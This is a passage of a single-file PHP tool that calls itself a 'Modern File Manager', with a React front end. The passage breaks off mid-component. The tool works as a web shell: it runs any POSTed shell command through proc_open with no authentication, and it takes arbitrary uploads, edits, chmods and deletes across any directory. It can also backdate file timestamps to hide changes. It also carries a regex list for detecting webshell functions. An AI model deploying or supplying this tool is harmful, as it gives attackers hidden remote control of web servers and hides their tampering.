<?php
// Modern File Manager - Single PHP File with ZIP/UNZIP functionality and Global Loading
// Futuristic 2025 Design with React + Tailwind CSS

// Basic PHP backend functionality
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$currentDir = realpath($currentDir) ?: '.';

// Get the document root path for URL conversion
$documentRoot = $_SERVER['DOCUMENT_ROOT'];
$scriptPath = dirname($_SERVER['SCRIPT_FILENAME']);

// Calculate the base URL path (relative to document root)
$baseUrlPath = '';
if (strpos($scriptPath, $documentRoot) === 0) {
    $baseUrlPath = substr($scriptPath, strlen($documentRoot));
    $baseUrlPath = str_replace('\\', '/', $baseUrlPath); // Normalize slashes
    $baseUrlPath = rtrim($baseUrlPath, '/');
}

// Function to check if file is suspicious
function isSuspiciousFile($filePath) {
    if (!is_file($filePath) || !is_readable($filePath)) {
        return false;
    }
    
    // Only check files that can contain executable code
    $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    $executableExtensions = ['php', 'php3', 'php4', 'php5', 'phtml', 'js', 'jsp', 'asp', 'aspx', 'pl', 'py', 'rb'];
    
    if (!in_array($ext, $executableExtensions)) {
        return false;
    }
    
    $content = file_get_contents($filePath);
    if ($content === false) {
        return false;
    }
    
    // Define more specific suspicious patterns
    $suspiciousPatterns = [
        '/eval\s*\(/i',                                    // eval(
        '/base64_decode\s*\(/i',                          // base64_decode(
        '/gzinflate\s*\(/i',                              // gzinflate(
        '/shell_exec\s*\(/i',                             // shell_exec(
        '/system\s*\(/i',                                 // system(
        '/exec\s*\(/i',                                   // exec(
        '/passthru\s*\(/i',                               // passthru(
        '/assert\s*\(/i',                                 // assert(
        '/preg_replace\s*$$.*\/.*e.*$$/i',               // preg_replace with /e modifier
        '/create_function\s*\(/i',                        // create_function(
        '/file_get_contents\s*\(\s*["\']php:\/\/input/i', // php://input
        '/\$_(?:GET|POST|REQUEST)\s*\[\s*["\'][^"\']*["\']\s*\]\s*\(/i', // $_GET['cmd']( pattern
        '/move_uploaded_file.*\$_/i',                     // move_uploaded_file with user input
        '/fwrite\s*\(.*\$_(?:GET|POST|REQUEST)/i',       // fwrite with user input
        '/fputs\s*\(.*\$_(?:GET|POST|REQUEST)/i',        // fputs with user input
        '/curl_exec\s*\(/i',                              // curl_exec(
        '/proc_open\s*\(/i',                              // proc_open(
        '/popen\s*\(/i',                                  // popen(
        '/ReflectionFunction\s*\(/i'                      // ReflectionFunction(
    ];
    
    // Check for suspicious patterns
    foreach ($suspiciousPatterns as $pattern) {
        if (preg_match($pattern, $content)) {
            return true;
        }
    }
    
    // Additional check for obfuscated code patterns
    $obfuscationPatterns = [
        '/\$[a-zA-Z_][a-zA-Z0-9_]*\s*=\s*["\'][a-zA-Z0-9+\/=]{50,}["\'];/i', // Long base64-like strings
        '/str_rot13\s*\(/i',                              // str_rot13(
        '/gzuncompress\s*\(/i',                           // gzuncompress(
        '/gzdecode\s*\(/i',                               // gzdecode(
        '/\$\w+\(\$\w+\(\$\w+\(/i',                      // Nested function calls pattern
        '/chr\s*$$\s*\d+\s*$$\s*\.\s*chr\s*\(/i',       // chr concatenation
    ];
    
    foreach ($obfuscationPatterns as $pattern) {
        if (preg_match($pattern, $content)) {
            return true;
        }
    }
    
    return false;
}

// Handle ZIP operation
if (isset($_POST['action']) && $_POST['action'] === 'zip_files') {
    $items = $_POST['items'] ?? [];
    $response = ['success' => false, 'message' => ''];
    
    if (empty($items)) {
        $response['message'] = 'No files selected for compression';
    } else if (!class_exists('ZipArchive')) {
        $response['message'] = 'ZIP extension not available on this server';
    } else {
        $zip = new ZipArchive();
        $zipName = 'archive_' . date('Ymd_His') . '.zip';
        $zipPath = $currentDir . '/' . $zipName;
        
        // Check if zip file already exists
        $counter = 1;
        while (file_exists($zipPath)) {
            $zipName = 'archive_' . date('Ymd_His') . '_' . $counter . '.zip';
            $zipPath = $currentDir . '/' . $zipName;
            $counter++;
        }
        
        if ($zip->open($zipPath, ZipArchive::CREATE) === TRUE) {
            $hasFiles = false;
            
            foreach ($items as $item) {
                $itemPath = $currentDir . '/' . $item;
                
                if (is_file($itemPath)) {
                    $zip->addFile($itemPath, $item);
                    $hasFiles = true;
                } else if (is_dir($itemPath)) {
                    // Add directory recursively
                    $iterator = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($itemPath, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    
                    foreach ($iterator as $file) {
                        $filePath = $file->getRealPath();
                        $relativePath = $item . '/' . substr($filePath, strlen($itemPath) + 1);
                        
                        if ($file->isDir()) {
                            $zip->addEmptyDir($relativePath);
                        } else if ($file->isFile()) {
                            $zip->addFile($filePath, $relativePath);
                            $hasFiles = true;
                        }
                    }
                }
            }
            
            if ($hasFiles) {
                $zip->close();
                $response['success'] = true;
                $response['message'] = 'Files compressed successfully to ' . $zipName;
            } else {
                $zip->close();
                unlink($zipPath);
                $response['message'] = 'No files found to compress';
            }
        } else {
            $response['message'] = 'Failed to create ZIP file';
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// Handle UNZIP operation
if (isset($_POST['action']) && $_POST['action'] === 'unzip_file') {
    $filename = $_POST['filename'] ?? '';
    $response = ['success' => false, 'message' => ''];
    
    if (empty($filename)) {
        $response['message'] = 'No file specified for extraction';
    } else if (!class_exists('ZipArchive')) {
        $response['message'] = 'ZIP extension not available on this server';
    } else {
        $zipPath = $currentDir . '/' . $filename;
        
        if (!file_exists($zipPath)) {
            $response['message'] = 'ZIP file not found';
        } else {
            $zip = new ZipArchive();
            
            if ($zip->open($zipPath) === TRUE) {
                // Extract to current directory
                if ($zip->extractTo($currentDir)) {
                    $zip->close();
                    $response['success'] = true;
                    $response['message'] = 'ZIP file extracted successfully';
                } else {
                    $zip->close();
                    $response['message'] = 'Failed to extract ZIP file';
                }
            } else {
                $response['message'] = 'Failed to open ZIP file - file may be corrupted';
            }
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// Handle Shell Finder scan
if (isset($_GET['action']) && $_GET['action'] === 'shell_scan') {
    $suspiciousFiles = [];
    
    // Recursive scan function
    function scanDirectory($dir, $rootDir) {
        $results = [];
        if (!is_dir($dir) || !is_readable($dir)) {
            return $results;
        }
        
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            
            $fullPath = $dir . '/' . $file;
            $relativePath = str_replace($rootDir . '/', '', $fullPath);
            
            if (is_dir($fullPath)) {
                // Recursive scan subdirectories
                $results = array_merge($results, scanDirectory($fullPath, $rootDir));
            } else {
                // Check if file is suspicious
                if (isSuspiciousFile($fullPath)) {
                    $results[] = [
                        'file' => $file,
                        'path' => $relativePath,
                        'directory' => dirname($relativePath)
                    ];
                }
            }
        }
        return $results;
    }
    
    // Start scanning from current directory
    $suspiciousFiles = scanDirectory($currentDir, $currentDir);
    
    header('Content-Type: application/json');
    echo json_encode([
        'success' => true,
        'files' => $suspiciousFiles,
        'scanned_from' => $currentDir
    ]);
    exit;
}

// Handle command execution
if (isset($_POST['action']) && $_POST['action'] === 'execute_command') {
    $command = $_POST['command'] ?? '';
    $output = '';
    $error = '';
    
    if (!empty($command)) {
        // Change to current directory before executing command
        chdir($currentDir);
        
        // Execute command and capture output
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );
        
        $process = proc_open($command, $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode([
        'output' => $output,
        'error' => $error,
        'command' => $command
    ]);
    exit;
}

// Handle file reading for editor
if (isset($_GET['action']) && $_GET['action'] === 'read_file' && isset($_GET['file'])) {
    $filename = $_GET['file'];
    $fullPath = $currentDir . '/' . $filename;
    
    // Security check - ensure file is within current directory
    $realPath = realpath($fullPath);
    if ($realPath && strpos($realPath, realpath($currentDir)) === 0 && is_file($realPath)) {
        // Set proper content type for text files
        header('Content-Type: text/plain; charset=utf-8');
        
        // Read file content using file_get_contents
        $content = file_get_contents($realPath);
        
        // Ensure proper encoding
        if ($content !== false) {
            // Convert to UTF-8 if needed
            if (!mb_check_encoding($content, 'UTF-8')) {
                $content = mb_convert_encoding($content, 'UTF-8', 'auto');
            }
            echo $content;
        } else {
            http_response_code(500);
            echo 'Error reading file';
        }
    } else {
        http_response_code(404);
        echo 'File not found or access denied';
    }
    exit;
}

// Handle file URL path calculation
if (isset($_GET['action']) && $_GET['action'] === 'get_file_url' && isset($_GET['file'])) {
    $filename = $_GET['file'];
    $fullPath = $currentDir . '/' . $filename;
    
    // Security check - ensure file is within current directory
    $realPath = realpath($fullPath);
    if ($realPath && strpos($realPath, realpath($currentDir)) === 0 && is_file($realPath)) {
        // Calculate the relative path from document root
        $relativePath = '';
        if (strpos($realPath, $documentRoot) === 0) {
            $relativePath = substr($realPath, strlen($documentRoot));
        } else {
            // If not in document root, try to calculate relative to script path
            $relativeToScript = str_replace($scriptPath, '', $realPath);
            $relativePath = $baseUrlPath . $relativeToScript;
        }
        
        // Normalize slashes and ensure leading slash
        $relativePath = str_replace('\\', '/', $relativePath);
        $relativePath = '/' . ltrim($relativePath, '/');
        
        header('Content-Type: application/json');
        echo json_encode([
            'url' => $relativePath
        ]);
    } else {
        http_response_code(404);
        echo 'File not found or access denied';
    }
    exit;
}

// Handle file operations
if ($_POST) {
    $action = $_POST['action'] ?? '';
    
    switch ($action) {
        case 'create_file':
            $filename = $_POST['filename'] ?? '';
            if ($filename) {
                file_put_contents($currentDir . '/' . $filename, '');
            }
            break;
            
        case 'create_folder':
            $foldername = $_POST['foldername'] ?? '';
            if ($foldername) {
                mkdir($currentDir . '/' . $foldername, 0755, true);
            }
            break;
            
        case 'upload_file':
            if (isset($_FILES['file'])) {
                move_uploaded_file($_FILES['file']['tmp_name'], $currentDir . '/' . $_FILES['file']['name']);
            }
            break;
            
        case 'delete':
            $items = $_POST['items'] ?? [];
            foreach ($items as $item) {
                $fullPath = $currentDir . '/' . $item;
                if (is_dir($fullPath)) {
                    rmdir($fullPath);
                } else {
                    unlink($fullPath);
                }
            }
            break;
            
        case 'rename':
            $oldName = $_POST['old_name'] ?? '';
            $newName = $_POST['new_name'] ?? '';
            if ($oldName && $newName) {
                rename($currentDir . '/' . $oldName, $currentDir . '/' . $newName);
            }
            break;
            
        case 'save_file':
            $filename = $_POST['filename'] ?? '';
            $content = $_POST['content'] ?? '';
            if ($filename) {
                file_put_contents($currentDir . '/' . $filename, $content);
            }
            break;
            
        case 'change_permissions':
            $filename = $_POST['filename'] ?? '';
            $permissions = $_POST['permissions'] ?? '';
            if ($filename && $permissions) {
                chmod($currentDir . '/' . $filename, octdec($permissions));
            }
            break;
            
        case 'change_datetime':
            $filename = $_POST['filename'] ?? '';
            $datetime = $_POST['datetime'] ?? '';
            if ($filename && $datetime) {
                $timestamp = strtotime($datetime);
                touch($currentDir . '/' . $filename, $timestamp);
            }
            break;
    }
    
    // Redirect to prevent form resubmission
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// Get directory contents
function getDirectoryContents($dir) {
    $items = [];
    if (is_dir($dir)) {
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $fullPath = $dir . '/' . $file;
                $isReadable = is_readable($fullPath);
                $isWritable = is_writable($fullPath);
                
                // Check if file can be edited (readable and either writable or not a directory)
                $canEdit = $isReadable && (is_dir($fullPath) || $isWritable);
                
                // Check if file is suspicious (only for files, not directories)
                $isSuspicious = false;
                if (is_file($fullPath)) {
                    $isSuspicious = isSuspiciousFile($fullPath);
                }
                
                $items[] = [
                    'name' => $file,
                    'type' => is_dir($fullPath) ? 'folder' : 'file',
                    'size' => is_file($fullPath) ? filesize($fullPath) : 0,
                    'modified' => filemtime($fullPath),
                    'permissions' => substr(sprintf('%o', fileperms($fullPath)), -3),
                    'writable' => $isWritable,
                    'readable' => $isReadable,
                    'canEdit' => $canEdit,
                    'isSuspicious' => $isSuspicious
                ];
            }
        }
    }
    
    // Sort items: folders first, then files
    usort($items, function($a, $b) {
        if ($a['type'] !== $b['type']) {
            return $a['type'] === 'folder' ? -1 : 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $items;
}

$items = getDirectoryContents($currentDir);
$breadcrumbs = explode('/', str_replace('\\', '/', $currentDir));

// Calculate the relative path from document root to current directory
$relativeCurrentDir = '';
$realCurrentDir = realpath($currentDir);
if (strpos($realCurrentDir, $documentRoot) === 0) {
    $relativeCurrentDir = substr($realCurrentDir, strlen($documentRoot));
} else {
    // If not in document root, try to calculate relative to script path
    $relativeToScript = str_replace($scriptPath, '', $realCurrentDir);
    $relativeCurrentDir = $baseUrlPath . $relativeToScript;
}
$relativeCurrentDir = str_replace('\\', '/', $relativeCurrentDir);
$relativeCurrentDir = '/' . ltrim($relativeCurrentDir, '/');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern File Manager 2025 - With Global Loading</title>
    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        'neon-blue': '#00f5ff',
                        'neon-cyan': '#00E5FF',
                        'neon-purple': '#bf00ff',
                        'dark-bg': '#0a0a0f',
                        'dark-surface': '#1a1a2e',
                        'dark-border': '#2a2a3e',
                        'light-bg': '#f8fafc',
                        'light-surface': '#ffffff',
                        'light-border': '#e2e8f0'
                    },
                    boxShadow: {
                        'neon': '0 0 20px rgba(0, 245, 255, 0.3)',
                        'neon-purple': '0 0 20px rgba(191, 0, 255, 0.3)',
                        'glow': '0 0 30px rgba(0, 245, 255, 0.2)',
                        'neon-glow': '0 0 20px rgba(0, 229, 255, 0.4)'
                    },
                    animation: {
                        'slide-in-right': 'slideInRight 0.3s ease-out',
                        'slide-out-right': 'slideOutRight 0.3s ease-in',
                        'pulse-slow': 'pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite',
                        'spin-neon': 'spin 0.8s linear infinite',
                        'fade-in': 'fadeIn 0.3s ease-out',
                        'fade-out': 'fadeOut 0.3s ease-in'
                    },
                    keyframes: {
                        slideInRight: {
                            '0%': { transform: 'translateX(100%)', opacity: '0' },
                            '100%': { transform: 'translateX(0)', opacity: '1' }
                        },
                        slideOutRight: {
                            '0%': { transform: 'translateX(0)', opacity: '1' },
                            '100%': { transform: 'translateX(100%)', opacity: '0' }
                        },
                        fadeIn: {
                            '0%': { opacity: '0' },
                            '100%': { opacity: '1' }
                        },
                        fadeOut: {
                            '0%': { opacity: '1' },
                            '100%': { opacity: '0' }
                        }
                    }
                }
            }
        }
    </script>
    <style>
        /* Custom scrollbar for dark mode */
        .dark ::-webkit-scrollbar {
            width: 8px;
        }
        .dark ::-webkit-scrollbar-track {
            background: #1a1a2e;
        }
        .dark ::-webkit-scrollbar-thumb {
            background: linear-gradient(45deg, #00f5ff, #bf00ff);
            border-radius: 4px;
        }
        .dark ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(45deg, #bf00ff, #00f5ff);
        }
        
        /* Custom scrollbar for light mode */
        .light ::-webkit-scrollbar {
            width: 8px;
        }
        .light ::-webkit-scrollbar-track {
            background: #f1f5f9;
        }
        .light ::-webkit-scrollbar-thumb {
            background: linear-gradient(45deg, #3b82f6, #8b5cf6);
            border-radius: 4px;
        }
        .light ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(45deg, #8b5cf6, #3b82f6);
        }
        
        /* Animations */
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 20px rgba(0, 245, 255, 0.3); }
            50% { box-shadow: 0 0 30px rgba(0, 245, 255, 0.5); }
        }
        
        .animate-pulse-glow {
            animation: pulse-glow 2s ease-in-out infinite;
        }

        /* Drag and drop animations */
        @keyframes drag-bounce {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .drag-active {
            animation: drag-bounce 0.6s ease-in-out infinite;
        }

        /* Image viewer backdrop blur */
        .backdrop-blur-custom {
            backdrop-filter: blur(8px);
        }

        /* Swipe gesture styles */
        .swipe-container {
            touch-action: pan-x;
        }

        /* 2. Global Loading Overlay & Fancy Spinner CSS */
        #loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; 
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 9999;
        }

        /* Fancy two-ring spinner */
        .fancy-spinner {
            position: relative; 
            width: 80px; 
            height: 80px;
        }
        .fancy-spinner .ring {
            box-sizing: border-box;
            position: absolute;
            border-radius: 50%;
            border: 6px solid transparent;
            animation: spin 1s linear infinite;
            top: 0; left: 0; right: 0; bottom: 0;
        }
        .fancy-spinner .ring1 {
            border-top-color: #00E5FF;
            box-shadow: 0 0 12px #00E5FF;
            animation-duration: 1s;
        }
        .fancy-spinner .ring2 {
            border-right-color: #8AFFC1;
            box-shadow: 0 0 8px #8AFFC1;
            animation-duration: 1.5s;
            transform: scale(0.7);
            top: 10px; left: 10px; right: 10px; bottom: 10px;
        }

        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }

        /* Loading text */
        .loading-text {
            margin-top: 16px;
            font-family: sans-serif;
            font-size: 15px;
            color: #FFF;
            text-align: center;
        }
    </style>
</head>
<body class="bg-light-bg dark:bg-dark-bg text-gray-900 dark:text-white min-h-screen transition-colors">
    <!-- 1. Global Loading overlay - comprehensive version -->
    <div id="loading-overlay" style="
        display: none;
        position: fixed;
        top: 0; left: 0;
        width: 100%; height: 100%;
        background: rgba(0,0,0,0.6);
        align-items: center;
        justify-content: center;
        flex-direction: column;
        z-index: 9999;
        ">
        <div class="fancy-spinner">
            <div class="ring ring1"></div>
            <div class="ring ring2"></div>
        </div>
        <div class="loading-text" style="
            margin-top: 16px;
            font-family: sans-serif;
            font-size: 15px;
            color: #FFFFFF;
            text-align: center;
            ">
            Loading…
        </div>
    </div>

    <div id="root"></div>

    <script>
        // 3. JavaScript Global Hooks - comprehensive version
        
        // Show/hide helper functions
        function showLoading(label = 'Loading…') {
            const overlay = document.getElementById('loading-overlay');
            if (overlay) {
                const textElement = overlay.querySelector('.loading-text');
                if (textElement) {
                    textElement.textContent = label;
                }
                overlay.style.display = 'flex';
            }
        }

        function hideLoading() {
            const overlay = document.getElementById('loading-overlay');
            if (overlay) {
                overlay.style.display = 'none';
            }
        }

        // 3.1. Intercept all fetch calls globally
        (function() {
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                // Don't show loading for very quick internal calls
                const url = args[0];
                if (typeof url === 'string' && !url.includes('action=')) {
                    showLoading('Loading…');
                }
                
                return originalFetch.apply(this, args)
                    .finally(() => {
                        // Small delay to prevent flicker on fast requests
                        setTimeout(hideLoading, 100);
                    });
            };
        })();

        // 3.2. Hook page navigation (F5, address bar refresh, browser back/forward)
        window.addEventListener('beforeunload', () => {
            showLoading('Refreshing page…');
        });

        // 3.3. Hook single-page app navigation (history API)
        (function() {
            const originalPushState = history.pushState;
            const originalReplaceState = history.replaceState;
            
            history.pushState = function(...args) {
                showLoading('Navigating…');
                return originalPushState.apply(this, args);
            };
            
            history.replaceState = function(...args) {
                showLoading('Navigating…');
                return originalReplaceState.apply(this, args);
            };
            
            window.addEventListener('popstate', () => {
                showLoading('Navigating…');
            });
        })();

        // 3.4. Hook form submissions
        document.addEventListener('submit', function(e) {
            showLoading('Processing form…');
        });

        // 3.5. Hook link clicks for navigation
        document.addEventListener('click', function(e) {
            const link = e.target.closest('a');
            if (link && link.href && !link.href.startsWith('javascript:') && !link.href.startsWith('#')) {
                showLoading('Loading page…');
            }
        });

        // 3.6. Enhanced performAction for manual operations
        function performAction(url, options, label) {
            showLoading(label || 'Processing…');
            return fetch(url, options)
                .then(res => {
                    if (res.headers.get('content-type')?.includes('application/json')) {
                        return res.json();
                    }
                    return res.text();
                })
                .catch(err => {
                    console.error('Action error:', err);
                    throw err;
                })
                .finally(() => {
                    setTimeout(hideLoading, 200);
                });
        }

        // 3.7. Auto-hide loading on page load complete
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(hideLoading, 500);
        });

        window.addEventListener('load', function() {
            setTimeout(hideLoading, 300);
        });

        // 3.8. Handle React component mounting
        setTimeout(() => {
            hideLoading();
        }, 1000);
    </script>

    <script type="text/babel">
        const { useState, useEffect, useRef } = React;

        // Icons as React components
        const Icons = {
            File: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
            ),
            Folder: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z" />
                </svg>
            ),
            Upload: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                </svg>
            ),
            Delete: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                </svg>
            ),
            Edit: () => (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
                </svg>
            ),
            FolderPlus: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v6m0 0v6m0-6h6m-6 0H6" />
                </svg>
            ),
            Rename: () => (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" />
                </svg>
            ),
            Shield: () => (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
            ),
            Clock: () => (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
            ),
            Sun: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
                </svg>
            ),
            Moon: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M20.354 15.354A9 9 0 018.646 3.646A9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" />
                </svg>
            ),
            Close: () => (
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
            ),
            Terminal: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                </svg>
            ),
            Play: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.828 14.828a4 4 0 01-5.656 0M9 10h1.586a1 1 0 01.707.293l2.414 2.414a1 1 0 00.707.293H15M9 10v4a2 2 0 002 2h2a2 2 0 002-2v-4M9 10V9a2 2 0 012-2h2a2 2 0 012 2v1" />
                </svg>
            ),
            Copy: () => (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                </svg>
            ),
            Warning: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.732-.833-2.464 0L4.34 16.5c-.77.833.192 2.5 1.732 2.5z" />
                </svg>
            ),
            Search: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                </svg>
            ),
            Archive: () => (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" />
                </svg>
            ),
            ChevronDown: () => (
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                </svg>
            )
        };

        // Action Dropdown Component
        const ActionDropdown = ({ selectedItems, onZip, onUnzip, isProcessing }) => {
            const [isOpen, setIsOpen] = useState(false);
            const [selectedAction, setSelectedAction] = useState('');

            if (selectedItems.length === 0) return null;

            // Check if any selected item is a ZIP file
            const hasZipFiles = selectedItems.some(item => 
                item.toLowerCase().endsWith('.zip')
            );

            // Check if any selected item is NOT a ZIP file
            const hasNonZipFiles = selectedItems.some(item => 
                !item.toLowerCase().endsWith('.zip')
            );

            const handleActionSelect = (action) => {
                setSelectedAction(action);
                setIsOpen(false);
            };

            const handleGo = () => {
                if (selectedAction === 'zip' && hasNonZipFiles) {
                    onZip(selectedItems.filter(item => !item.toLowerCase().endsWith('.zip')));
                } else if (selectedAction === 'unzip' && hasZipFiles) {
                    // For unzip, we only process the first ZIP file
                    const zipFile = selectedItems.find(item => item.toLowerCase().endsWith('.zip'));
                    if (zipFile) {
                        onUnzip(zipFile);
                    }
                }
                setSelectedAction('');
            };

            return (
                <div className="bg-light-surface dark:bg-dark-surface border border-light-border dark:border-dark-border rounded-lg p-4 mb-4">
                    <div className="flex items-center space-x-4">
                        <span className="text-sm font-medium text-gray-700 dark:text-gray-300">
                            {selectedItems.length} item{selectedItems.length > 1 ? 's' : ''} selected
                        </span>
                        
                        <div className="relative">
                            <button
                                onClick={() => setIsOpen(!isOpen)}
                                disabled={isProcessing}
                                className="flex items-center space-x-2 px-4 py-2 bg-gray-100 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                                <span>{selectedAction || 'Action'}</span>
                                <Icons.ChevronDown />
                            </button>
                            
                            {isOpen && (
                                <div className="absolute top-full left-0 mt-1 w-32 bg-light-surface dark:bg-dark-surface border border-light-border dark:border-dark-border rounded-lg shadow-lg z-10">
                                    {hasNonZipFiles && (
                                        <button
                                            onClick={() => handleActionSelect('zip')}
                                            className="w-full text-left px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors flex items-center space-x-2"
                                        >
                                            <Icons.Archive />
                                            <span>Zip</span>
                                        </button>
                                    )}
                                    {hasZipFiles && (
                                        <button
                                            onClick={() => handleActionSelect('unzip')}
